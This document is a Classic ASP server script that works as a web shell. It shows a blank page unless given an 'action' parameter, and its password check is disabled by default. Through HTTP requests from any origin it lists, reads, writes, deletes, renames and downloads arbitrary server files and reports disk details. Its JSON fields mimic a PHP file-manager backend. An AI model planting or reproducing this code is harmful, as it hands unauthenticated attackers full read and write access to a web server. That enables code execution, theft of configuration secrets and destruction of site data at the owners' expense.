<%
On Error Resume Next
Response.Buffer = True
Response.ContentType = "application/json"
Response.AddHeader "Access-Control-Allow-Origin", "*"

Dim fso, action, pw
Set fso = Server.CreateObject("Scripting.FileSystemObject")

action = Request("action")
pw = Request("password")

' No action = blank page
If action = "" Then
    Response.ContentType = "text/html"
    Response.End
End If

' Password (change here)
Dim PASSWORD
PASSWORD = ""

If PASSWORD <> "" Then
    If pw <> PASSWORD Then
        Response.Write "null"
        Response.End
    End If
End If

If action = "list" Then
    Dim path, folder, item, json, parentPath
    path = Request("path")
    If path = "" Or path = "/" Then
        path = Server.MapPath(".")
    End If

    If fso.FolderExists(path) Then
        Set folder = fso.GetFolder(path)
        json = "{""success"":true,""data"":{""path"":""" & Replace(path, "\", "\\") & """,""items"":["

        parentPath = fso.GetParentFolderName(path)
        If parentPath <> "" Then
            json = json & "{""name"":"".."",""path"":""" & Replace(parentPath, "\", "\\") & """,""is_dir"":true,""size"":0,""size_formatted"":""-"",""mtime"":0,""perms"":""drwxr-xr-x"",""readable"":true,""writable"":true}"
        End If

        Dim itemMtime
        For Each item In folder.SubFolders
            If Right(json, 1) <> "[" Then json = json & ","
            itemMtime = DateDiff("s", DateSerial(1970, 1, 1), item.DateLastModified)
            json = json & "{""name"":""" & item.Name & """,""path"":""" & Replace(item.Path, "\", "\\") & """,""is_dir"":true,""size"":0,""size_formatted"":""-"",""mtime"":" & itemMtime & ",""perms"":""drwxr-xr-x"",""readable"":true,""writable"":true}"
        Next

        For Each item In folder.Files
            If Right(json, 1) <> "[" Then json = json & ","
            itemMtime = DateDiff("s", DateSerial(1970, 1, 1), item.DateLastModified)
            json = json & "{""name"":""" & item.Name & """,""path"":""" & Replace(item.Path, "\", "\\") & """,""is_dir"":false,""size"":" & item.Size & ",""size_formatted"":""" & item.Size & " B"",""mtime"":" & itemMtime & ",""perms"":""-rw-r--r--"",""readable"":true,""writable"":true}"
        Next

        json = json & "]},""message"":""""}"
        Response.Write json
        Set folder = Nothing
    Else
        Response.Write "{""success"":false,""message"":""Directory not found""}"
    End If

ElseIf action = "read" Then
    Dim rPath, ts, content
    rPath = Request("path")
    If fso.FileExists(rPath) Then
        Set ts = fso.OpenTextFile(rPath, 1)
        content = ts.ReadAll
        ts.Close
        Set ts = Nothing
        content = Replace(content, "\", "\\")
        content = Replace(content, """", "\""")
        content = Replace(content, vbCrLf, "\n")
        content = Replace(content, vbCr, "\n")
        content = Replace(content, vbLf, "\n")
        content = Replace(content, Chr(9), "\t")
        Response.Write "{""success"":true,""data"":{""path"":""" & Replace(rPath, "\", "\\") & """,""content"":""" & content & """},""message"":""""}"
    Else
        Response.Write "{""success"":false,""message"":""File not found""}"
    End If

ElseIf action = "write" Then
    Dim wPath, wContent, wTs
    wPath = Request("path")
    wContent = Request("content")
    If wPath <> "" Then
        Set wTs = fso.CreateTextFile(wPath, True)
        wTs.Write wContent
        wTs.Close
        Set wTs = Nothing
        Response.Write "{""success"":true,""message"":""Saved""}"
    Else
        Response.Write "{""success"":false,""message"":""Path empty""}"
    End If

ElseIf action = "mkdir" Then
    Dim mPath, mRaw
    mRaw = Request("path")
    mPath = Replace(mRaw, "/", "\")
    Do While Left(mPath, 1) = "\"
        mPath = Mid(mPath, 2)
    Loop
    If mPath <> "" Then
        If Not fso.FolderExists(mPath) Then
            fso.CreateFolder mPath
            Response.Write "{""success"":true,""message"":""Created""}"
        Else
            Response.Write "{""success"":false,""message"":""Already exists""}"
        End If
    Else
        Response.Write "{""success"":false,""message"":""Path empty. Raw=[" & mRaw & "]""}"
    End If

ElseIf action = "upload" Then
    Response.Write "{""success"":false,""message"":""Upload not supported in Classic ASP""}"

ElseIf action = "delete" Then
    Dim dPath
    dPath = Request("path")
    If fso.FolderExists(dPath) Then
        fso.DeleteFolder dPath, True
        Response.Write "{""success"":true,""message"":""Deleted""}"
    ElseIf fso.FileExists(dPath) Then
        fso.DeleteFile dPath, True
        Response.Write "{""success"":true,""message"":""Deleted""}"
    Else
        Response.Write "{""success"":false,""message"":""Not found""}"
    End If

ElseIf action = "rename" Then
    Dim oldPath, newPath
    oldPath = Request("old_path")
    newPath = Request("new_path")
    If fso.FolderExists(oldPath) Then
        fso.MoveFolder oldPath, newPath
        Response.Write "{""success"":true,""message"":""Renamed""}"
    ElseIf fso.FileExists(oldPath) Then
        fso.MoveFile oldPath, newPath
        Response.Write "{""success"":true,""message"":""Renamed""}"
    Else
        Response.Write "{""success"":false,""message"":""Not found""}"
    End If

ElseIf action = "download" Then
    Dim dlPath, stream
    dlPath = Request("path")
    If fso.FileExists(dlPath) Then
        Response.Clear
        Response.ContentType = "application/octet-stream"
        Response.AddHeader "Content-Disposition", "attachment; filename=""" & fso.GetFileName(dlPath) & """"
        Set stream = Server.CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.LoadFromFile dlPath
        Response.BinaryWrite stream.Read
        stream.Close
        Set stream = Nothing
    Else
        Response.Write "File not found"
    End If

ElseIf action = "server" Then
    Dim drive, diskFree, diskTotal, srvPath
    srvPath = Server.MapPath(".")
    diskFree = 0
    diskTotal = 0
    On Error Resume Next
    Set drive = fso.GetDrive(fso.GetDriveName(srvPath))
    diskFree = drive.FreeSpace
    diskTotal = drive.TotalSize
    Set drive = Nothing
    On Error GoTo 0
    Response.Write "{""success"":true,""data"":{""php_version"":""ASP Classic"",""server_software"":""IIS"",""document_root"":""" & Replace(srvPath, "\", "\\") & """,""script_path"":""" & Replace(srvPath, "\", "\\") & """,""upload_max"":""N/A"",""post_max"":""N/A"",""disk_free"":""" & diskFree & """,""disk_total"":""" & diskTotal & """,""current_user"":""Anonymous""},""message"":""""}"

ElseIf action = "touch" Then
    Response.Write "{""success"":false,""message"":""Not supported""}"

ElseIf action = "info" Then
    Dim iPath, iFile, iFolder, iMtime, iCtime, iAtime, epoch
    epoch = DateSerial(1970, 1, 1)
    iPath = Request("path")
    If fso.FileExists(iPath) Then
        Set iFile = fso.GetFile(iPath)
        iMtime = DateDiff("s", epoch, iFile.DateLastModified)
        iCtime = DateDiff("s", epoch, iFile.DateCreated)
        iAtime = DateDiff("s", epoch, iFile.DateLastAccessed)
        Response.Write "{""success"":true,""data"":{""path"":""" & Replace(iPath, "\", "\\") & """,""name"":""" & iFile.Name & """,""is_dir"":false,""size"":" & iFile.Size & ",""size_formatted"":""" & iFile.Size & " B"",""mtime"":" & iMtime & ",""ctime"":" & iCtime & ",""atime"":" & iAtime & ",""perms"":""-rw-r--r--"",""perms_octal"":""0644"",""readable"":true,""writable"":true,""owner"":0,""group"":0},""message"":""""}"
        Set iFile = Nothing
    ElseIf fso.FolderExists(iPath) Then
        Set iFolder = fso.GetFolder(iPath)
        iMtime = DateDiff("s", epoch, iFolder.DateLastModified)
        iCtime = DateDiff("s", epoch, iFolder.DateCreated)
        iAtime = DateDiff("s", epoch, iFolder.DateLastAccessed)
        Response.Write "{""success"":true,""data"":{""path"":""" & Replace(iPath, "\", "\\") & """,""name"":""" & iFolder.Name & """,""is_dir"":true,""size"":0,""size_formatted"":""-"",""mtime"":" & iMtime & ",""ctime"":" & iCtime & ",""atime"":" & iAtime & ",""perms"":""drwxr-xr-x"",""perms_octal"":""0755"",""readable"":true,""writable"":true,""owner"":0,""group"":0},""message"":""""}"
        Set iFolder = Nothing
    Else
        Response.Write "{""success"":false,""message"":""Not found""}"
    End If

Else
    Response.Write "{""success"":false,""message"":""Unknown action""}"
End If

Set fso = Nothing
%>